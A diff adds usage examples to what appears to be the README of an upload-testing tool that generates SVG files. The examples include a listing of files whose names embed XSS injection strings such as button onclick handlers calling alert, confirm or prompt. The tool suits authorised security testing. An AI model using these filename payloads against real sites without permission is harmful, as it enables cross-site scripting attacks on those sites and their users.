@@ -21,3 +21,39 @@ optional arguments:
   -h, --help            show this help message and exit
   -v, --verbose         display information verbosely
 ```
+
+```
+User$ python payloadGen.py -f x.svg -a
+By: IΛMGӨÐ
+INFO: Loading Config File
+INFO: Program Starting
+INFO: Reading Payload Directories From Config File
+INFO: Reading XSS Payload From Config File
+INFO: Program Complete!
+INFO: Reading File Extension Payloads From Config File
+INFO: Program Complete!
+```
+
+```
+User$ ls
+_SVG
+```
+
+```
+User$ ls _SVG
+_FileTypeBypass	_XSSName
+```
+
+```
+$User ls _SVG/_XSSName/
+"><button onclick= alert`0`>.svg
+"><button onclick= confirm`0`>.svg
+"><button onclick= console.log`0`>.svg
+"><button onclick= prompt`0`>.svg
+"><button onclick=alert`0`>.svg
+"><button onclick=confirm`0`>.svg
+"><button onclick=console.log`0`>.svg
+...
+...
+...
+```
